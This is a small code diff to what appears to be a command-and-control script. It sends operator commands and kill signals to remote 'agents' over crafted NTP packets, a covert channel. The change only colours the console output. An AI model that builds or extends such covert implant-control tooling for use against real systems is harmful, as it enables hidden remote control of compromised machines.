@@ -1,10 +1,11 @@
 from transport import packets
+from termcolor import colored
 
 def sendRefCMD(tsObj, destGroup, endpoint, refId):
     #send manual ping, expect resync back from agent
     #send refid kill, agent will clean up, status dead in db
     if destGroup == "agent":
-        print(f"Sending {refId} to {endpoint}")
+        print(colored(f" Sending Reference \"{refId}\" ==> ({endpoint})\n", "magenta"))
 
         iPacket = packets.IDPacket(endpoint, refId)
         iPacket.sendIdPacket()
@@ -12,23 +13,23 @@ def sendRefCMD(tsObj, destGroup, endpoint, refId):
     else:
         data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
         for ip in data:
-            print(f"Sending {refId} to {ip[0]} ({endpoint})")
+            print(colored(f" Sending Reference \"{refId}\" ==> {ip[0]} ({endpoint})\n", "magenta"))
 
             iPacket = packets.IDPacket(ip, refId)
             iPacket.sendIdPacket()
 
 
 #send command via NTP message, craft mal packet
-def sendCMD(tsObj, cmd, destGroup, endpoint): #
+def sendCMD(tsObj, cmd, destGroup, endpoint): 
     if destGroup == "agent": 
-        print(f"Sending \"{cmd}\" to ({endpoint})")
+        print(colored(f" Sending Command \"{cmd}\" ==> ({endpoint})\n", "magenta"))
         cPacket = packets.CommandPacket(endpoint, cmd)
         cPacket.sendCommandPacket()
 
     else:
         data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
         for ip in data:
-            print(f"Sending \"{cmd}\" to {ip[0]} ({endpoint})")
+            print(colored(f" Sending Command \"{cmd}\" ==> {ip[0]} ({endpoint})\n", "magenta"))
 
             cPacket = packets.CommandPacket(ip, cmd)
             cPacket.sendCommandPacket()
